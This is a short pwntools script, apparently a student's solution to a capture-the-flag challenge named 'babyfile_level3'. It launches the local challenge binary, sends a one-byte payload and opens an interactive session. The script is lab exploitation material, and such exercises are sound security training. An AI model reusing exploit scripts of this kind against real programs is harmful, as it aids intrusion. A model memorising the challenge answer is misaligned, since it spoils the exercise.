#Nagib Lakhdari 3si2
from pwn import *

# Set the architecture context to amd64
context.arch = 'amd64'

# Start the process for the challenge binary
p = process("/challenge/babyfile_level3")

# Create the payload with a single byte value of 1
payload = bytes([1])

# Send the payload to the process
p.send(payload)

# Interact with the process to get the output
p.interactive()
